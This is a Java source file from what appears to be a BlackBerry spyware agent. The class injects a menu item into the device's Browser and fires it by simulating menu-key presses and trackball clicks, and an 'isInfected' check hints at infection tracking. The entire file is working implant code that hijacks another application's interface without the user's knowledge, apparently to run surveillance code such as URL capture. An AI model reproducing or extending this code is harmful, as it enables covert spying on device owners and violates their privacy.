package blackberry.injection;

import net.rim.device.api.system.RuntimeStore;
import net.rim.device.api.ui.Keypad;
import blackberry.agent.url.BrowserMenuItem;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.Singleton;

class AppInjectorBrowser implements AppInjectorInterface, Singleton {
    //#ifdef DEBUG
    private static Debug debug = new Debug("AppInjBrowser", DebugLevel.VERBOSE);
    //#endif

    BrowserMenuItem menu = BrowserMenuItem.getInstance();

    private static AppInjectorBrowser instance;
    private static final long GUID = 0xa2b7338e410f087bL;

    public static synchronized AppInjectorBrowser getInstance() {
        if (instance == null) {
            instance = (AppInjectorBrowser) RuntimeStore.getRuntimeStore().get(
                    GUID);
            if (instance == null) {
                final AppInjectorBrowser singleton = new AppInjectorBrowser();

                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }
        }
        return instance;
    }
    
    private AppInjectorBrowser(){
        
    }

    public boolean requestForeground() {
        return true;
    }

    public boolean injectMenu() {
        menu.addMenuBrowser();
        return true;
    }

    public boolean deleteMenu() {
        menu.removeMenuBrowser();
        return true;
    }

    public boolean callMenuByKey() {

        //#ifdef DEBUG
        debug.info("calling browser menu");
        //#endif

        KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
        // Utils.sleep(100);
        KeyInjector.pressRawKey(menu.toString().charAt(0));
        // Utils.sleep(500);
        KeyInjector.trackBallClick();

        return true;

    }

    public String getAppName() {

        return "Browser";
    }

    public void callMenuInContext() {
        menu.callMenuInContext();

    }

    public boolean isInfected() {
        // TODO Auto-generated method stub
        return false;
    }



}
